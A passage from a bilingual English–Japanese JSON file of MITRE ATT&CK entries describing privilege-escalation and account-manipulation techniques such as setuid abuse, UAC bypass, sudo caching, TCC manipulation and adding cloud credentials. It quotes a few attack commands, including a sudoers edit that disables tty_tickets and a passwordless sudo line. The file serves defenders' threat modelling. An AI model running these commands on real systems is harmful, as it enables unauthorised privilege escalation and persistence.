                "description_jp": "攻撃者は、より高いレベルの権限を得るために、権限昇格を制御するように設計されたメカニズムを回避する可能性があります。ほとんどの最新システムには、ユーザーがマシン上で実行できる権限を制限することを目的としたネイティブの昇格制御メカニズムが含まれています。より高いリスクと見なされる可能性のあるタスクを実行するためには、特定のユーザーに承認を与える必要があります。(引用: TechNet How UAC Works)(引用: sudo man page 2018) 攻撃者は、システム上で権限を昇格させるために、組み込みの制御メカニズムを利用するいくつかの方法を実行できます。(引用: OSX Keydnap malware)(引用: Fortinet Fareit)",
                "subtechniques": [
                    {
                        "id": "T1548.001",
                        "name_eng": "Setuid and Setgid",
                        "name_jp": "SetuidおよびSetgid",
                        "description_eng": "An adversary may abuse configurations where an application has the setuid or setgid bits set in order to get code running in a different (and possibly more privileged) user’s context. On Linux or macOS, when the setuid or setgid bits are set for an application binary, the application will run with the privileges of the owning user or group respectively.(Citation: setuid man page) Normally an application is run in the current user’s context, regardless of which user or group owns the application. However, there are instances where programs need to be executed in an elevated context to function properly, but the user running them may not have the specific required privileges.\n\nInstead of creating an entry in the sudoers file, which must be done by root, any user can specify the setuid or setgid flag to be set for their own applications (i.e. [Linux and Mac File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222/002)). The <code>chmod</code> command can set these bits with bitmasking, <code>chmod 4777 [file]</code> or via shorthand naming, <code>chmod u+s [file]</code>. This will enable the setuid bit. To enable the setgid bit, <code>chmod 2775</code> and <code>chmod g+s</code> can be used.\n\nAdversaries can use this mechanism on their own malware to make sure they're able to execute in elevated contexts in the future.(Citation: OSX Keydnap malware) This abuse is often part of a \"shell escape\" or other actions to bypass an execution environment with restricted permissions.\n\nAlternatively, adversaries may choose to find and target vulnerable binaries with the setuid or setgid bits already enabled (i.e. [File and Directory Discovery](https://attack.mitre.org/techniques/T1083)). The setuid and setguid bits are indicated with an \"s\" instead of an \"x\" when viewing a file's attributes via <code>ls -l</code>. The <code>find</code> command can also be used to search for such files. For example, <code>find / -perm +4000 2>/dev/null</code> can be used to find files with setuid set and <code>find / -perm +2000 2>/dev/null</code> may be used for setgid. Binaries that have these bits set may then be abused by adversaries.(Citation: GTFOBins Suid)",
                        "description_jp": "攻撃者は、アプリケーションにsetuidまたはsetgidビットが設定されている構成を悪用して、異なる（そして場合によってはより特権的な）ユーザーのコンテキストでコードを実行させることができます。LinuxまたはmacOSでは、アプリケーションバイナリにsetuidまたはsetgidビットが設定されている場合、アプリケーションはそれぞれ所有ユーザーまたはグループの権限で実行されます。(引用: setuid man page) 通常、アプリケーションは、どのユーザーまたはグループがアプリケーションを所有しているかに関係なく、現在のユーザーのコンテキストで実行されます。ただし、プログラムが正しく機能するために昇格されたコンテキストで実行する必要があるが、それらを実行しているユーザーが必要な特定の権限を持っていない場合があります。\n\nrootによって実行する必要があるsudoersファイルにエントリを作成する代わりに、任意のユーザーが自分のアプリケーションにsetuidまたはsetgidフラグを設定するように指定できます（つまり、[LinuxおよびMacのファイルとディレクトリのアクセス許可の変更](https://attack.mitre.org/techniques/T1222/002)）。<code>chmod</code>コマンドは、ビットマスキング（<code>chmod 4777 [file]</code>）または略記名（<code>chmod u+s [file]</code>）を使用してこれらのビットを設定できます。これにより、setuidビットが有効になります。setgidビットを有効にするには、<code>chmod 2775</code>および<code>chmod g+s</code>を使用できます。\n\n攻撃者は、将来昇格されたコンテキストで実行できるようにするために、このメカニズムを独自のマルウェアで使用できます。(引用: OSX Keydnap malware) この悪用は、しばしば「シェルエスケープ」または制限された権限を持つ実行環境をバイパスするためのその他のアクションの一部です。\n\nあるいは、攻撃者は、setuidまたはsetgidビットが既に有効になっている脆弱なバイナリを見つけてターゲットにすることを選択する場合があります（つまり、[ファイルとディレクトリの発見](https://attack.mitre.org/techniques/T1083)）。setuidおよびsetgidビットは、<code>ls -l</code>を介してファイルの属性を表示するときに「x」の代わりに「s」で示されます。<code>find</code>コマンドを使用してそのようなファイルを検索することもできます。例えば、<code>find / -perm +4000 2>/dev/null</code>を使用してsetuidが設定されたファイルを見つけることができ、<code>find / -perm +2000 2>/dev/null</code>をsetgidに使用できます。これらのビットが設定されているバイナリは、攻撃者によって悪用される可能性があります。(引用: GTFOBins Suid)"
                    },
                    {
                        "id": "T1548.005",
                        "name_eng": "Temporary Elevated Cloud Access",
                        "name_jp": "一時的なクラウドアクセス権限昇格",
                        "description_eng": "Adversaries may abuse permission configurations that allow them to gain temporarily elevated access to cloud resources. Many cloud environments allow administrators to grant user or service accounts permission to request just-in-time access to roles, impersonate other accounts, pass roles onto resources and services, or otherwise gain short-term access to a set of privileges that may be distinct from their own. \n\nJust-in-time access is a mechanism for granting additional roles to cloud accounts in a granular, temporary manner. This allows accounts to operate with only the permissions they need on a daily basis, and to request additional permissions as necessary. Sometimes just-in-time access requests are configured to require manual approval, while other times the desired permissions are automatically granted.(Citation: Azure Just in Time Access 2023)\n\nAccount impersonation allows user or service accounts to temporarily act with the permissions of another account. For example, in GCP users with the `iam.serviceAccountTokenCreator` role can create temporary access tokens or sign arbitrary payloads with the permissions of a service account, while service accounts with domain-wide delegation permission are permitted to impersonate Google Workspace accounts.(Citation: Google Cloud Service Account Authentication Roles)(Citation: Hunters Domain Wide Delegation Google Workspace 2023)(Citation: Google Cloud Just in Time Access 2023)(Citation: Palo Alto Unit 42 Google Workspace Domain Wide Delegation 2023) In Exchange Online, the `ApplicationImpersonation` role allows a service account to use the permissions associated with specified user accounts.(Citation: Microsoft Impersonation and EWS in Exchange) \n\nMany cloud environments also include mechanisms for users to pass roles to resources that allow them to perform tasks and authenticate to other services. While the user that creates the resource does not directly assume the role they pass to it, they may still be able to take advantage of the role's access -- for example, by configuring the resource to perform certain actions with the permissions it has been granted. In AWS, users with the `PassRole` permission can allow a service they create to assume a given role, while in GCP, users with the `iam.serviceAccountUser` role can attach a service account to a resource.(Citation: AWS PassRole)(Citation: Google Cloud Service Account Authentication Roles)\n\nWhile users require specific role assignments in order to use any of these features, cloud administrators may misconfigure permissions. This could result in escalation paths that allow adversaries to gain access to resources beyond what was originally intended.(Citation: Rhino Google Cloud Privilege Escalation)(Citation: Rhino Security Labs AWS Privilege Escalation)\n\n**Note:** this technique is distinct from [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003), which involves assigning permanent roles to accounts rather than abusing existing permissions structures to gain temporarily elevated access to resources. However, adversaries that compromise a sufficiently privileged account may grant another account they control [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003) that would allow them to also abuse these features. This may also allow for greater stealth than would be had by directly using the highly privileged account, especially when logs do not clarify when role impersonation is taking place.(Citation: CrowdStrike StellarParticle January 2022)",
                        "description_jp": "攻撃者は、一時的に昇格されたクラウドリソースへのアクセスを可能にする権限設定を悪用する可能性があります。多くのクラウド環境では、管理者はユーザーアカウントまたはサービスアカウントに対し、ロールへのジャストインタイムアクセスを要求したり、他のアカウントになりすましたり、リソースやサービスにロールを渡したり、あるいは自身の権限とは異なる可能性のある一連の権限への短期的なアクセスを許可することができます。\n\nジャストインタイムアクセスは、クラウドアカウントに追加のロールをきめ細かく一時的に付与するためのメカニズムです。これにより、アカウントは日常的に必要な権限のみで運用し、必要に応じて追加の権限を要求できます。ジャストインタイムアクセス要求は、手動承認が必要なように設定されることもあれば、目的の権限が自動的に付与されることもあります。(引用: Azure Just in Time Access 2023)\n\nアカウントの偽装により、ユーザーアカウントまたはサービスアカウントは、一時的に別のアカウントの権限で行動できます。例えば、GCPでは`iam.serviceAccountTokenCreator`ロールを持つユーザーは、サービスアカウントの権限で一時的なアクセストークンを作成したり、任意のペイロードに署名したりできます。一方、ドメイン全体の委任権限を持つサービスアカウントは、Google Workspaceアカウントになりすますことが許可されています。(引用: Google Cloud Service Account Authentication Roles)(引用: Hunters Domain Wide Delegation Google Workspace 2023)(引用: Google Cloud Just in Time Access 2023)(引用: Palo Alto Unit 42 Google Workspace Domain Wide Delegation 2023) Exchange Onlineでは、`ApplicationImpersonation`ロールにより、サービスアカウントは指定されたユーザーアカウントに関連付けられた権限を使用できます。(引用: Microsoft Impersonation and EWS in Exchange)\n\n多くのクラウド環境には、ユーザーがリソースにロールを渡してタスクを実行したり、他のサービスに認証したりすることを可能にするメカニズムも含まれています。リソースを作成するユーザーは、それに渡すロールを直接引き継ぐわけではありませんが、付与された権限で特定のアクションを実行するようにリソースを設定するなどして、ロールのアクセスを利用できる場合があります。AWSでは、`PassRole`権限を持つユーザーは、作成したサービスに特定のロールを引き継がせることができます。一方、GCPでは、`iam.serviceAccountUser`ロールを持つユーザーは、サービスアカウントをリソースにアタッチできます。(引用: AWS PassRole)(引用: Google Cloud Service Account Authentication Roles)\n\nユーザーがこれらの機能のいずれかを使用するには特定のロール割り当てが必要ですが、クラウド管理者は権限を誤って設定する可能性があります。これにより、攻撃者が元々意図されていた範囲を超えてリソースにアクセスできるようになる昇格パスが生じる可能性があります。(引用: Rhino Google Cloud Privilege Escalation)(引用: Rhino Security Labs AWS Privilege Escalation)\n\n**注:** このテクニックは、アカウントに永続的なロールを割り当てるのではなく、既存の権限構造を悪用してリソースへの一時的に昇格されたアクセスを得ることを伴う[追加のクラウドロール](https://attack.mitre.org/techniques/T1098/003)とは異なります。ただし、十分に特権のあるアカウントを侵害した攻撃者は、制御下にある別のアカウントに、これらの機能も悪用できる[追加のクラウドロール](https://attack.mitre.org/techniques/T1098/003)を付与する可能性があります。これは、特にログでロールの偽装が行われているタイミングが明確でない場合、特権の高いアカウントを直接使用するよりもステルス性が高まる可能性があります。(引用: CrowdStrike StellarParticle January 2022)"
                    },
                    {
                        "id": "T1548.002",
                        "name_eng": "Bypass User Account Control",
                        "name_jp": "ユーザーアカウント制御のバイパス",
                        "description_eng": "Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.(Citation: TechNet How UAC Works)\n\nIf the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) objects without prompting the user through the UAC notification box.(Citation: TechNet Inside UAC)(Citation: MSDN COM Elevation) An example of this is use of [Rundll32](https://attack.mitre.org/techniques/T1218/011) to load a specifically crafted DLL which loads an auto-elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.(Citation: Davidson Windows)\n\nMany methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods(Citation: Github UACMe) that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:\n\n* <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script.(Citation: enigma0x3 Fileless UAC Bypass)(Citation: Fortinet Fareit)\n\nAnother bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.(Citation: SANS UAC Bypass)",
                        "description_jp": "攻撃者はUACメカニズムをバイパスして、システム上のプロセス権限を昇格させる可能性があります。Windowsユーザーアカウント制御（UAC）は、プログラムがその権限（低から高までの整合性レベルとして追跡される）を昇格させて、管理者レベルの権限でタスクを実行できるようにするもので、場合によってはユーザーに確認を求めることがあります。ユーザーへの影響は、高強制下での操作の拒否から、ローカル管理者グループに属していてプロンプトをクリックした場合の操作の許可、または管理者パスワードを入力して操作を完了させることまで及びます。(引用: TechNet How UAC Works)\n\nコンピュータのUAC保護レベルが最高レベル以外に設定されている場合、特定のWindowsプログラムは、UAC通知ボックスを介してユーザーにプロンプトを表示することなく、権限を昇格させたり、一部の昇格された[コンポーネントオブジェクトモデル](https://attack.mitre.org/techniques/T1559/001)オブジェクトを実行したりできます。(引用: TechNet Inside UAC)(引用: MSDN COM Elevation) この例としては、[Rundll32](https://attack.mitre.org/techniques/T1218/011)を使用して、自動昇格された[コンポーネントオブジェクトモデル](https://attack.mitre.org/techniques/T1559/001)オブジェクトをロードし、通常は昇格されたアクセスが必要となる保護されたディレクトリでファイル操作を実行する、特別に細工されたDLLをロードすることが挙げられます。悪意のあるソフトウェアが信頼されたプロセスに注入され、ユーザーにプロンプトを表示することなく昇格された権限を取得することもあります。(引用: Davidson Windows)\n\nUACをバイパスする多くの方法が発見されています。UACMEのGithub readmeページには、発見され実装されたメソッドの広範なリストが含まれていますが(引用: Github UACMe)、バイパスの包括的なリストではない可能性があります。追加のバイパス方法は定期的に発見されており、次のようなものが実際に使用されています。\n\n* <code>eventvwr.exe</code>は自動昇格し、指定されたバイナリまたはスクリプトを実行できます。(引用: enigma0x3 Fileless UAC Bypass)(引用: Fortinet Fareit)\n\n管理者権限を持つアカウントの資格情報がわかっている場合、UACは単一システムのセキュリティメカニズムであり、あるシステムで実行されているプロセスの権限や整合性はリモートシステムでは不明であり、デフォルトで高整合性となるため、一部の横方向の移動テクニックを介して別のバイパスが可能です。(引用: SANS UAC Bypass)"
                    },
                    {
                        "id": "T1548.004",
                        "name_eng": "Elevated Execution with Prompt",
                        "name_jp": "プロンプトによる昇格実行",
                        "description_eng": "Adversaries may leverage the <code>AuthorizationExecuteWithPrivileges</code> API to escalate privileges by prompting the user for credentials.(Citation: AppleDocs AuthorizationExecuteWithPrivileges) The purpose of this API is to give application developers an easy way to perform operations with root privileges, such as for application installation or updating. This API does not validate that the program requesting root privileges comes from a reputable source or has been maliciously modified. \n\nAlthough this API is deprecated, it still fully functions in the latest releases of macOS. When calling this API, the user will be prompted to enter their credentials but no checks on the origin or integrity of the program are made. The program calling the API may also load world writable files which can be modified to perform malicious behavior with elevated privileges.\n\nAdversaries may abuse <code>AuthorizationExecuteWithPrivileges</code> to obtain root privileges in order to install malicious software on victims and install persistence mechanisms.(Citation: Death by 1000 installers; it's all broken!)(Citation: Carbon Black Shlayer Feb 2019)(Citation: OSX Coldroot RAT) This technique may be combined with [Masquerading](https://attack.mitre.org/techniques/T1036) to trick the user into granting escalated privileges to malicious code.(Citation: Death by 1000 installers; it's all broken!)(Citation: Carbon Black Shlayer Feb 2019) This technique has also been shown to work by modifying legitimate programs present on the machine that make use of this API.(Citation: Death by 1000 installers; it's all broken!)",
                        "description_jp": "攻撃者は<code>AuthorizationExecuteWithPrivileges</code> APIを利用して、ユーザーに資格情報を要求することで権限を昇格させる可能性があります。(引用: AppleDocs AuthorizationExecuteWithPrivileges) このAPIの目的は、アプリケーション開発者がアプリケーションのインストールや更新など、ルート権限で操作を簡単に行えるようにすることです。このAPIは、ルート権限を要求するプログラムが信頼できるソースからのものであるか、または悪意を持って変更されていないかを検証しません。\n\nこのAPIは非推奨ですが、macOSの最新リリースでも完全に機能します。このAPIを呼び出すと、ユーザーは資格情報の入力を求められますが、プログラムの出所や整合性に関するチェックは行われません。APIを呼び出すプログラムは、昇格された権限で悪意のある動作を実行するように変更できる、グローバルに書き込み可能なファイルをロードすることもあります。\n\n攻撃者は<code>AuthorizationExecuteWithPrivileges</code>を悪用してルート権限を取得し、被害者に悪意のあるソフトウェアをインストールしたり、永続化メカニズムをインストールしたりする可能性があります。(引用: Death by 1000 installers; it's all broken!)(引用: Carbon Black Shlayer Feb 2019)(引用: OSX Coldroot RAT) このテクニックは、ユーザーを騙して悪意のあるコードに昇格された権限を付与させるために[マスカレード](https://attack.mitre.org/techniques/T1036)と組み合わせることができます。(引用: Death by 1000 installers; it's all broken!)(引用: Carbon Black Shlayer Feb 2019) このテクニックは、このAPIを利用するマシン上に存在する正当なプログラムを変更することでも機能することが示されています。(引用: Death by 1000 installers; it's all broken!)"
                    },
                    {
                        "id": "T1548.003",
                        "name_eng": "Sudo and Sudo Caching",
                        "name_jp": "SudoおよびSudoキャッシング",
                        "description_eng": "Adversaries may perform sudo caching and/or use the sudoers file to elevate privileges. Adversaries may do this to execute commands as other users or spawn processes with higher privileges.\n\nWithin Linux and MacOS systems, sudo (sometimes referred to as \"superuser do\") allows users to perform commands from terminals with elevated privileges and to control who can perform these commands on the system. The <code>sudo</code> command \"allows a system administrator to delegate authority to give certain users (or groups of users) the ability to run some (or all) commands as root or another user while providing an audit trail of the commands and their arguments.\"(Citation: sudo man page 2018) Since sudo was made for the system administrator, it has some useful configuration features such as a <code>timestamp_timeout</code>, which is the amount of time in minutes between instances of <code>sudo</code> before it will re-prompt for a password. This is because <code>sudo</code> has the ability to cache credentials for a period of time. Sudo creates (or touches) a file at <code>/var/db/sudo</code> with a timestamp of when sudo was last run to determine this timeout. Additionally, there is a <code>tty_tickets</code> variable that treats each new tty (terminal session) in isolation. This means that, for example, the sudo timeout of one tty will not affect another tty (you will have to type the password again).\n\nThe sudoers file, <code>/etc/sudoers</code>, describes which users can run which commands and from which terminals. This also describes which commands users can run as other users or groups. This provides the principle of least privilege such that users are running in their lowest possible permissions for most of the time and only elevate to other users or permissions as needed, typically by prompting for a password. However, the sudoers file can also specify when to not prompt users for passwords with a line like <code>user1 ALL=(ALL) NOPASSWD: ALL</code>.(Citation: OSX.Dok Malware) Elevated privileges are required to edit this file though.\n\nAdversaries can also abuse poor configurations of these mechanisms to escalate privileges without needing the user's password. For example, <code>/var/db/sudo</code>'s timestamp can be monitored to see if it falls within the <code>timestamp_timeout</code> range. If it does, then malware can execute sudo commands without needing to supply the user's password. Additional, if <code>tty_tickets</code> is disabled, adversaries can do this from any tty for that user.\n\nIn the wild, malware has disabled <code>tty_tickets</code> to potentially make scripting easier by issuing <code>echo \\'Defaults !tty_tickets\\' >> /etc/sudoers</code>.(Citation: cybereason osx proton) In order for this change to be reflected, the malware also issued <code>killall Terminal</code>. As of macOS Sierra, the sudoers file has <code>tty_tickets</code> enabled by default.",
                        "description_jp": "攻撃者はsudoキャッシングを実行したり、sudoersファイルを使用して権限を昇格させたりする可能性があります。攻撃者はこれを利用して、他のユーザーとしてコマンドを実行したり、より高い権限でプロセスを起動したりする可能性があります。\n\nLinuxおよびMacOSシステム内では、sudo（「スーパーユーザー実行」とも呼ばれる）により、ユーザーは昇格された権限でターミナルからコマンドを実行し、システム上でこれらのコマンドを実行できるユーザーを制御できます。<code>sudo</code>コマンドは、「システム管理者が、特定のユーザー（またはユーザーグループ）に、コマンドとその引数の監査証跡を提供しながら、ルートまたは別のユーザーとして一部（またはすべて）のコマンドを実行する権限を与えることを許可します。」(引用: sudo man page 2018) sudoはシステム管理者向けに作成されたため、<code>timestamp_timeout</code>などの便利な構成機能があります。これは、パスワードの再入力を求める前に<code>sudo</code>のインスタンス間で経過する時間（分単位）です。これは、<code>sudo</code>が一定期間資格情報をキャッシュする機能を持っているためです。Sudoは、このタイムアウトを決定するために、最後にsudoが実行されたときのタイムスタンプを持つファイルを<code>/var/db/sudo</code>に作成（またはタッチ）します。さらに、各新しいtty（ターミナルセッション）を個別に扱う<code>tty_tickets</code>変数があります。これは、たとえば、あるttyのsudoタイムアウトが別のttyに影響しないことを意味します（再度パスワードを入力する必要があります）。\n\n<code>/etc/sudoers</code>ファイルは、どのユーザーがどのコマンドをどのターミナルから実行できるかを記述します。また、ユーザーが他のユーザーまたはグループとして実行できるコマンドも記述します。これにより、ユーザーはほとんどの場合、可能な限り低い権限で実行し、必要に応じて他のユーザーまたは権限に昇格する（通常はパスワードの入力を求める）という最小権限の原則が提供されます。ただし、sudoersファイルは、<code>user1 ALL=(ALL) NOPASSWD: ALL</code>のような行でユーザーにパスワードの入力を求めないように指定することもできます。(引用: OSX.Dok Malware) ただし、このファイルを編集するには昇格された権限が必要です。\n\n攻撃者はまた、これらのメカニズムの不適切な構成を悪用して、ユーザーのパスワードを必要とせずに権限を昇格させる可能性があります。例えば、<code>/var/db/sudo</code>のタイムスタンプを監視して、<code>timestamp_timeout</code>の範囲内にあるかどうかを確認できます。もしそうであれば、マルウェアはユーザーのパスワードを入力する必要なくsudoコマンドを実行できます。さらに、<code>tty_tickets</code>が無効になっている場合、攻撃者はそのユーザーの任意のttyからこれを実行できます。\n\n実際に、マルウェアはスクリプト作成を容易にするために、<code>echo \\'Defaults !tty_tickets\\' >> /etc/sudoers</code>を発行して<code>tty_tickets</code>を無効にしています。(引用: cybereason osx proton) この変更を反映させるために、マルウェアは<code>killall Terminal</code>も発行しました。macOS Sierra以降、sudoersファイルではデフォルトで<code>tty_tickets</code>が有効になっています。"
                    },
                    {
                        "id": "T1548.006",
                        "name_eng": "TCC Manipulation",
                        "name_jp": "TCC操作",
                        "description_eng": "Adversaries can manipulate or abuse the Transparency, Consent, & Control (TCC) service or database to grant malicious executables elevated permissions. TCC is a Privacy & Security macOS control mechanism used to determine if the running process has permission to access the data or services protected by TCC, such as screen sharing, camera, microphone, or Full Disk Access (FDA).\n\nWhen an application requests to access data or a service protected by TCC, the TCC daemon (`tccd`) checks the TCC database, located at `/Library/Application Support/com.apple.TCC/TCC.db` (and `~/` equivalent), and an overwrites file (if connected to an MDM) for existing permissions. If permissions do not exist, then the user is prompted to grant permission. Once permissions are granted, the database stores the application's permissions and will not prompt the user again unless reset. For example, when a web browser requests permissions to the user's webcam, once granted the web browser may not explicitly prompt the user again.(Citation: welivesecurity TCC)\n\nAdversaries may access restricted data or services protected by TCC through abusing applications previously granted permissions through [Process Injection](https://attack.mitre.org/techniques/T1055) or executing a malicious binary using another application. For example, adversaries can use Finder, a macOS native app with FDA permissions, to execute a malicious [AppleScript](https://attack.mitre.org/techniques/T1059/002). When executing under the Finder App, the malicious [AppleScript](https://attack.mitre.org/techniques/T1059/002) inherits access to all files on the system without requiring a user prompt. When System Integrity Protection (SIP) is disabled, TCC protections are also disabled. For a system without SIP enabled, adversaries can manipulate the TCC database to add permissions to their malicious executable through loading an adversary controlled TCC database using environment variables and [Launchctl](https://attack.mitre.org/techniques/T1569/001).(Citation: TCC macOS bypass)(Citation: TCC Database)",
                        "description_jp": "攻撃者は、透過性、同意、制御（TCC）サービスまたはデータベースを操作または悪用して、悪意のある実行可能ファイルに昇格された権限を付与する可能性があります。TCCは、実行中のプロセスが画面共有、カメラ、マイク、またはフルディスクアクセス（FDA）など、TCCによって保護されているデータまたはサービスにアクセスする権限を持っているかどうかを判断するために使用されるPrivacy & Security macOS制御メカニズムです。\n\nアプリケーションがTCCによって保護されているデータまたはサービスへのアクセスを要求すると、TCCデーモン（`tccd`）は、`/Library/Application Support/com.apple.TCC/TCC.db`（および`~/`同等物）にあるTCCデータベースと、既存の権限についての上書きファイル（MDMに接続されている場合）を確認します。権限が存在しない場合は、ユーザーに権限の付与を求めるプロンプトが表示されます。権限が付与されると、データベースはアプリケーションの権限を保存し、リセットされない限りユーザーに再度プロンプトを表示しません。例えば、WebブラウザがユーザーのWebカメラへの権限を要求した場合、一度付与されるとWebブラウザはユーザーに明示的に再度プロンプトを表示しない場合があります。(引用: welivesecurity TCC)\n\n攻撃者は、以前に[プロセスインジェクション](https://attack.mitre.org/techniques/T1055)を介して権限が付与されたアプリケーションを悪用したり、別のアプリケーションを使用して悪意のあるバイナリを実行したりすることで、TCCによって保護されている制限されたデータまたはサービスにアクセスする可能性があります。例えば、攻撃者はFDA権限を持つmacOSネイティブアプリであるFinderを使用して、悪意のある[AppleScript](https://attack.mitre.org/techniques/T1059/002)を実行できます。Finderアプリで実行すると、悪意のある[AppleScript](https://attack.mitre.org/techniques/T1059/002)はユーザープロンプトを必要とせずにシステム上のすべてのファイルへのアクセスを継承します。システム整合性保護（SIP）が無効になっている場合、TCC保護も無効になります。SIPが無効になっているシステムの場合、攻撃者は環境変数と[Launchctl](https://attack.mitre.org/techniques/T1569/001)を使用して攻撃者が制御するTCCデータベースをロードすることにより、TCCデータベースを操作して悪意のある実行可能ファイルに権限を追加できます。(引用: TCC macOS bypass)(引用: TCC Database)"
                    }
                ]
            },
            {
                "id": "T1098",
                "name_eng": "Account Manipulation",
                "name_jp": "アカウント操作",
                "description_eng": "Adversaries may manipulate accounts to maintain and/or elevate access to victim systems. Account manipulation may consist of any action that preserves or modifies adversary access to a compromised account, such as modifying credentials or permission groups.(Citation: FireEye SMOKEDHAM June 2021) These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to bypass password duration policies and preserve the life of compromised credentials. \n\nIn order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain. However, account manipulation may also lead to privilege escalation where modifications grant access to additional roles, permissions, or higher-privileged [Valid Accounts](https://attack.mitre.org/techniques/T1078).",
                "description_jp": "攻撃者は、被害者システムへのアクセスを維持および/または昇格させるためにアカウントを操作する可能性があります。アカウント操作は、資格情報や権限グループの変更など、侵害されたアカウントへの攻撃者のアクセスを維持または変更するあらゆるアクションで構成される可能性があります。(引用: FireEye SMOKEDHAM June 2021) これらのアクションには、パスワード期間ポリシーをバイパスして侵害された資格情報の寿命を維持するために反復的なパスワード更新を実行するなど、セキュリティポリシーを破壊するように設計されたアカウントアクティビティも含まれる可能性があります。\n\nアカウントを作成または操作するためには、攻撃者はシステムまたはドメインに対する十分な権限を既に持っている必要があります。ただし、アカウント操作は、変更によって追加の役割、権限、またはより権限の高い[有効なアカウント](https://attack.mitre.org/techniques/T1078)へのアクセスが付与される特権昇格につながる可能性もあります。",
                "subtechniques": [
                    {
                        "id": "T1098.001",
                        "name_eng": "Additional Cloud Credentials",
                        "name_jp": "追加のクラウド認証情報",
                        "description_eng": "Adversaries may add adversary-controlled credentials to a cloud account to maintain persistent access to victim accounts and instances within the environment.\n\nFor example, adversaries may add credentials for Service Principals and Applications in addition to existing legitimate credentials in Azure / Entra ID.(Citation: Microsoft SolarWinds Customer Guidance)(Citation: Blue Cloud of Death)(Citation: Blue Cloud of Death Video) These credentials include both x509 keys and passwords.(Citation: Microsoft SolarWinds Customer Guidance) With sufficient permissions, there are a variety of ways to add credentials including the Azure Portal, Azure command line interface, and Azure or Az PowerShell modules.(Citation: Demystifying Azure AD Service Principals)\n\nIn infrastructure-as-a-service (IaaS) environments, after gaining access through [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004), adversaries may generate or import their own SSH keys using either the <code>CreateKeyPair</code> or <code>ImportKeyPair</code> API in AWS or the <code>gcloud compute os-login ssh-keys add</code> command in GCP.(Citation: GCP SSH Key Add) This allows persistent access to instances within the cloud environment without further usage of the compromised cloud accounts.(Citation: Expel IO Evil in AWS)(Citation: Expel Behind the Scenes)\n\nAdversaries may also use the <code>CreateAccessKey</code> API in AWS or the <code>gcloud iam service-accounts keys create</code> command in GCP to add access keys to an account. Alternatively, they may use the <code>CreateLoginProfile</code> API in AWS to add a password that can be used to log into the AWS Management Console for [Cloud Service Dashboard](https://attack.mitre.org/techniques/T1538).(Citation: Permiso Scattered Spider 2023)(Citation: Lacework AI Resource Hijacking 2024) If the target account has different permissions from the requesting account, the adversary may also be able to escalate their privileges in the environment (i.e. [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004)).(Citation: Rhino Security Labs AWS Privilege Escalation)(Citation: Sysdig ScarletEel 2.0) For example, in Entra ID environments, an adversary with the Application Administrator role can add a new set of credentials to their application's service principal. In doing so the adversary would be able to access the service principal’s roles and permissions, which may be different from those of the Application Administrator.(Citation: SpecterOps Azure Privilege Escalation) \n\nIn AWS environments, adversaries with the appropriate permissions may also use the `sts:GetFederationToken` API call to create a temporary set of credentials to [Forge Web Credentials](https://attack.mitre.org/techniques/T1606) tied to the permissions of the original user account. These temporary credentials may remain valid for the duration of their lifetime even if the original account’s API credentials are deactivated.\n(Citation: Crowdstrike AWS User Federation Persistence)\n\nIn Entra ID environments with the app password feature enabled, adversaries may be able to add an app password to a user account.(Citation: Mandiant APT42 Operations 2024) As app passwords are intended to be used with legacy devices that do not support multi-factor authentication (MFA), adding an app password can allow an adversary to bypass MFA requirements. Additionally, app passwords may remain valid even if the user’s primary password is reset.(Citation: Microsoft Entra ID App Passwords)",
                        "description_jp": "攻撃者は、環境内の被害者アカウントおよびインスタンスへの永続的なアクセスを維持するために、攻撃者が制御する資格情報をクラウドアカウントに追加する可能性があります。\n\n例えば、攻撃者は、Azure / Entra IDの既存の正当な資格情報に加えて、サービスプリンシパルおよびアプリケーションの資格情報を追加する可能性があります。(引用: Microsoft SolarWinds Customer Guidance)(引用: Blue Cloud of Death)(引用: Blue Cloud of Death Video) これらの資格情報には、x509キーとパスワードの両方が含まれます。(引用: Microsoft SolarWinds Customer Guidance) 十分な権限があれば、Azureポータル、Azureコマンドラインインターフェイス、AzureまたはAz PowerShellモジュールなど、資格情報を追加するさまざまな方法があります。(引用: Demystifying Azure AD Service Principals)\n\nInfrastructure-as-a-Service（IaaS）環境では、[クラウドアカウント](https://attack.mitre.org/techniques/T1078/004)を通じてアクセスを取得した後、攻撃者はAWSの<code>CreateKeyPair</code>または<code>ImportKeyPair</code> API、あるいはGCPの<code>gcloud compute os-login ssh-keys add</code>コマンドを使用して独自のSSHキーを生成またはインポートする可能性があります。(引用: GCP SSH Key Add) これにより、侵害されたクラウドアカウントをさらに使用することなく、クラウド環境内のインスタンスへの永続的なアクセスが可能になります。(引用: Expel IO Evil in AWS)(引用: Expel Behind the Scenes)\n\n攻撃者はまた、AWSの<code>CreateAccessKey</code> APIまたはGCPの<code>gcloud iam service-accounts keys create</code>コマンドを使用してアカウントにアクセスキーを追加することもあります。あるいは、AWSの<code>CreateLoginProfile</code> APIを使用して、[クラウドサービスダッシュボード](https://attack.mitre.org/techniques/T1538)用のAWS管理コンソールへのログインに使用できるパスワードを追加することもあります。(引用: Permiso Scattered Spider 2023)(引用: Lacework AI Resource Hijacking 2024) 